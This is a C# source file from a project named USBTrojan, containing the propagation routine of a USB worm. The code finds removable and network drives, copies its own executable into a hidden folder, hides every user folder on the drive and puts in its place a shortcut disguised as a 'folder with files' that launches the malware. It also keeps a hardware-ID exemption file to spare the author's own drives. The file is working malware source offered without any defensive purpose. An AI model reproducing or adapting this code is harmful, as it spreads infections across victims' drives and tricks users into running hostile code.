using System;
using System.Linq;
using System.Collections.Generic;
using System.Reflection;
using System.IO;

namespace USBTrojan
{
    class USB
    {
        const string home = "UTFsync";
        const string inf_data = "\\inf_data";
        const string file_name = "\\main.exe";
        public static List<string> blacklist = new List<string>();
        public static string hwid = string.Empty;
        
        public static string[] GetDrives()
        {
            return Environment.GetLogicalDrives();
        }
        public static bool IsInfected(string drive)
        {
            try
            {
                return File.Exists(drive + home + inf_data);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return false;
            }
        }
        public static bool CreateHomeDirectory(string drive)
        {
            try
            {
                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + home);
                directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return false;
        }
        public static bool Infect(string drive)
        {
            if (blacklist.Contains(drive)) return true;
            try
            {
                string f = drive + home + file_name, key = drive + "\\ut_sf.blacklist";
                if (File.Exists(key))
                {
                    if (File.ReadAllText(key) == hwid)
                    {
                        Console.WriteLine("Key verified");
                        blacklist.Add(drive);
                        return false;
                    }
                }
                if (File.Exists(f)) File.Delete(f);
                File.Copy(Assembly.GetExecutingAssembly().Location, f);
                DirectoryInfo dir = new DirectoryInfo(drive);
                foreach (var directory in dir.GetDirectories())
                {
                    if (CheckBlacklist(directory.Name)) continue;
                    directory.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
                    Shortcut.Create(f, drive + directory.Name + ".lnk", "-i " + directory.Name, "Папка с файлами", true);
                }
                File.Create(drive + home + inf_data);
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return false;
        }
        public static bool IsSupported(DriveInfo drive) => drive.AvailableFreeSpace > 1024 && drive.IsReady
            && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network)
            && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");
        static bool CheckBlacklist(string name) => new string[] { "UTFsync", "System Volume Information", "$RECYCLE.BIN" }.Contains(name);
    }
}
